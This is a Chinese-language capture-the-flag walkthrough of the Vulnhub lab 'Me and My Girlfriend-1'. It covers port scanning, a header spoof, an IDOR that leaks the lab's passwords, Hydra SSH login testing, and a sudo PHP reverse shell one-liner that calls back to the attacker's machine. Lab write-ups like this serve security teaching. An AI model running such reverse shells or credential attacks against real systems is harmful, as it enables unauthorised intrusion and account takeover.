---
layout: post
title: "Me and My Girlfriend-1 walkthrough"
date: 2021-11-03
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机                 | IP                |
| ---------------------- | ----------------- |
| 本机（Win10）          | `192.168.174.1`   |
| Kali                   | `192.168.174.128` |
| Me-and-My-Girlfriend-1 | `192.168.174.148` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.148`

```shell
┌──(root💀kali)-[~]
└─# nmap -p- -A 192.168.174.148
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-03 07:29 EDT
Nmap scan report for 192.168.174.148
Host is up (0.0012s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

扫描结果内容较少，访问web页面后根据给的提示信息添加 `x-forwarded-for: 127.0.0.1` 即可。

```shell
┌──(root💀kali)-[~]
└─# curl  http://192.168.174.148/
Who are you? Hacker? Sorry This Site Can Only Be Accessed local!<!-- Maybe you can search how to use x-forwarded-for --> 
```

修改请求头访问后在页面中存在登录和注册框，随意注册个账户登录后在查看用户信息处存在越权漏洞，修改 `user_id `的参数值就可以查看其他的账户信息，其中包括密码。

![1]({{ '/me-and-my-girlfriend-1/1.png' | prepend: site.url }})

至此通过枚举，得到了五个账户信息。

```txt
eweuhtandingan:skuyatuh
aingmaung:qwerty!!!
sundatea:indONEsia
sedihaingmah:cedihhihihi
alice:4lic3
```

将上述信息保存为`user_pass.txt`文件，并通过 `hydra` 工具进行 ssh 登录测试，发现 `alice` 账户可以 ssh 登录。

```shell
┌──(root💀kali)-[~]
└─# hydra -C user_pass.txt ssh://192.168.174.148
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-03 07:57:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries, ~1 try per task
[DATA] attacking ssh://192.168.174.148:22/
[22][ssh] host: 192.168.174.148   login: alice   password: 4lic3
1 of 1 target successfully completed, 1 valid password found
```

### Getshell

在 `/home/alice/.my_secret/flag1.txt` 文件中得到第一个 flag。

```shell
alice@gfriEND:~/.my_secret$ cat flag1.txt
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
```

查看该账户的 suid 权限时发现可执行具备 suid 权限的 `/usr/bin/php` 程序，后续操作就简单了，直接就是 `php` 提权。

```shell
alice@gfriEND:/home$ sudo -l
Matching Defaults entries for alice on gfriEND:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on gfriEND:
    (root) NOPASSWD: /usr/bin/php
```

### 提权

执行命令：`sudo /usr/bin/php -r '$sock=fsockopen("192.168.174.128",5566);exec("/bin/sh -i <&3 >&3 2>&3");'` 进行反弹shell，kali 监听 **5566** 端口就可拿到 root 账户的 shell，即可得到最后一个 flag。

```shell
# cat flag2.txt

  ________        __    ___________.__             ___________.__                ._.
 /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
 \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
        \/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!
Twitter: @makegreatagain_
Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
```

### 总结

靶机难度简单，值得总结的地方就只有 `hydra` 爆破命令：`hydra -C user_pass.txt ssh://192.168.174.148`。

